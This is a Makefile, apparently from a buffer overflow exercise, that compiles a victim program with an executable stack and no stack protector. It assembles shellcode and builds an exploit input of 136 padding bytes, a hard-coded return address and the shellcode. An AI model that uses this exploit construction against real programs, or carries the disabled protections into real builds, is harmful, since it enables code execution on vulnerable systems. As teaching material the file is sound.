CFLAGS = -O0 -z execstack -fno-stack-protector 

BUFFER_OVERFLOW_VICTIM_SRC = src/buffer_overflow_victim.c

all: buffer_overflow_victim buffer_overflow_shellcode

buffer_overflow_victim:
	$(CC) $(CFLAGS) $(BUFFER_OVERFLOW_VICTIM_SRC) -o bin/buffer_overflow_victim

buffer_overflow_shellcode:
	nasm src/buffer_overflow_shellcode.s -o bin/buffer_overflow_shellcode
	dd if=/dev/zero of=bin/buffer_overflow_input count=136
	echo -ne "\x24\xe0\xff\xff\xff\x7f\x00\x00"  >> bin/buffer_overflow_input
	cat bin/buffer_overflow_shellcode >> bin/buffer_overflow_input

clean:

disassembly_shell_code:
	objdump -m i386:x86-64:intel -b binary --adjust-vma=0x0 -D bin/buffer_overflow_shellcode






